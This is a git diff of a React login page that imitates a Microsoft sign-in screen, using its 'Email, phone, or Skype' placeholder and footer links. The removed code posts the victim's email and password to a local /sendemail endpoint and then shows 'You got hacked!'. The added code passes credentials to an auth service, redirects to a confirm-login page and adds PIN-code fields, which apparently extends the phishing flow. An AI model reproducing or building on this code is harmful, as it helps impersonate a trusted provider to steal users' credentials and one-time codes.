@@ -3,17 +3,34 @@ import logo from "./assets/logo.png"
 import {useState} from 'react';
 import * as React from "react";
 import axios from "axios"
-import { BrowserRouter, Routes, Route } from "react-router-dom";
+import { redirect } from 'react-router-dom'
+import {browserHistory} from "react-router"
+import auth from './services/authService'
+import global from "global"
 
-const Main = () => {
+const LoginPage = (props) => {
 
   const [window, setWindow] = useState(false)
   const [email, setEmail] = useState("")
   const [password, setPassword] = useState("")
+  const [loggedIn, setLoggedIn] = useState(false)
+  const [PINCode, setPINCode] = useState("")
+  const [error, setError] = useState("")
+  const [introduceCode, setIntroduceCode] = useState(false)
 
   const handleNext = () => {
     setWindow(true)
   }
+
+  React.useEffect(() => {
+    setLoggedIn(false)
+    setEmail("")
+    setPassword("")
+    setIntroduceCode(false)
+    setPINCode("")
+    
+    console.log()
+  }, [])
 
   const handleEmail = (e) => {
     setEmail(e.target.value)
@@ -23,20 +40,18 @@ const Main = () => {
     setPassword(e.target.value)
   }
 
-  async function sendEmail(email, password) {
-    try {
-      let res = await axios.post("http://localhost:30000/sendemail", {email, password, phoneNumber: ""})
-      console.log(res.data)
-    }  catch(err) {
-      console.log(err)
-    }
-    
-      
-  }
 
-  const handleLogin = (e) => {
-    sendEmail(email, password)
-    alert("You got hacked!")
+  const handleLogin = async () => {
+    try {
+      const res = await auth.login(email, password)
+      global.window.location.href = "/confirm-login?email=" + email
+
+    
+    } catch(err) {
+      console.log(err)
+      global.window.location.href = "/"
+      if (err.response.data) setError(err.response.data.message)
+    }  
   }
 
   return !window ? (
@@ -49,6 +64,7 @@ const Main = () => {
           <h2 className="title mb-16 mt-16">Sign in</h2>
           <form>
               <div className="mb-16">
+                  <small>{error}</small>
                   <input id="inp_uname" type="email" name="uname" className="input" onChange={handleEmail} value={email} placeholder="Email, phone, or Skype" />
               </div>
           </form>
@@ -62,7 +78,6 @@ const Main = () => {
       </div>
       </div>
 
-   
     <footer className="footer">
         <a href="#">Terms of use</a>
         <a href="#">Privacy & cookies</a>
@@ -79,6 +94,7 @@ const Main = () => {
           <h2 className="title mb-16 mt-16">Sign in</h2>
           <form>
               <div className="mb-16">
+                  <small>{error}</small>
                   <input id="inp_uname" type="password" name="uname" className="input" onChange={handlePassword} value={password} placeholder="Password" />
               </div>
           </form>
@@ -101,4 +117,4 @@ const Main = () => {
   )
 }
 
-export default Main;
+export default LoginPage;
